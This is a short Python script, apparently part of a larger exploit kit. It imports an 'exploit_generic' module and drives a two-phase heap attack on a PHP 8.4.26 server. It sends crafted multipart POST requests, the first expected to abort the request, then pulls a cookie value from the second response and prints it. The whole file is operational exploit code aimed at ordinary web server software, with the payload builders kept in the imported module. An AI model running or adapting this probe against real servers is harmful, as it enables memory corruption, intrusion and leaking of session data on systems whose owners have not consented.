#!/usr/bin/env python3
"""Phase-1-only probe using the generic allocator-calibration fields."""

from __future__ import annotations

import argparse
import dataclasses
from pathlib import Path
import sys
import urllib.parse


HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

import exploit_generic as exploit  # noqa: E402


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--host-header")
    parser.add_argument("--set", action="append", default=[], dest="assignments")
    parser.add_argument("--send-b", action="store_true")
    parser.add_argument("--output-dir", type=Path)
    args = parser.parse_args()

    profile = exploit.load_profile(
        "php-8.4.26-amd64", None, args.assignments
    )
    target = exploit.Target.parse(args.url)
    if args.host_header:
        target = dataclasses.replace(target, host_header=args.host_header)
    client = exploit.RawHTTP(
        target,
        timeout=90.0,
        retries=3,
        retry_delay=0.25,
        insecure=False,
        log=exploit.Log(1),
    )

    output = args.output_dir
    if output:
        output.mkdir(parents=True, exist_ok=True)

    body, boundary = exploit.build_off_a(profile)
    response_a = client.post_multipart(body, boundary, expected_abort=True)
    if output:
        (output / "heap-a.response").write_bytes(response_a)
    status_a = response_a.split(b"\r\n", 1)[0].decode("latin1", "replace")
    print(f"A status={status_a!r} bytes={len(response_a)}")

    if not args.send_b:
        return 0

    body, boundary = exploit.build_heap_b(profile)
    response_b = client.post_multipart(body, boundary)
    if output:
        (output / "heap-b.response").write_bytes(response_b)
    status_b = response_b.split(b"\r\n", 1)[0].decode("latin1", "replace")
    try:
        cookie = exploit.cookie_value(response_b)
        cookie_len = len(cookie)
        cookie_prefix = urllib.parse.quote_from_bytes(cookie[:32], safe="")
    except exploit.ExploitError:
        cookie_len = -1
        cookie_prefix = ""
    print(
        f"B status={status_b!r} bytes={len(response_b)} "
        f"cookie_len={cookie_len} cookie_prefix={cookie_prefix}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
